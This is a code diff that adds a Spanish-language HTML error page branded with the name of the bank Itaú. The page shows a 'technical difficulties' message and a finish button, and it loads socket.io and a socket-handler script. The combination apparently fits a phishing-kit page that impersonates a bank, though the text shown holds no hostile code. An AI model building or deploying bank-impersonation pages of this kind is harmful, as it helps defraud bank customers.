@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú - Error Técnico</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 540px;
+            margin: 0;
+            padding: 20px;
+            padding-left: 25px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .error-icon {
+            width: 50px;
+            height: 50px;
+            background-color: #dc3545;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            margin-top: 40px;
+        }
+
+        .error-icon::before {
+            content: '✕';
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 15px;
+            letter-spacing: -0.3px;
+        }
+
+        .message {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .code {
+            font-size: 13px;
+            color: #999999;
+            margin-bottom: 30px;
+        }
+
+        .finish-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #fe6200;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: auto;
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            width: calc(100% - 40px);
+            letter-spacing: 0.2px;
+        }
+
+        .finish-btn:hover {
+            background-color: #e55800;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 320px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="error-icon"></div>
+
+        <h1>Estamos presentando dificultades técnicas</h1>
+        
+        <p class="message">Danos un momento, estamos trabajando para solucionarlo.</p>
+        
+        <p class="code">Código: 500</p>
+
+        <button class="finish-btn" onclick="window.location.href='index.html?clear=true'">Finalizar</button>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="socket-handler.js"></script>
+</body>
+</html>
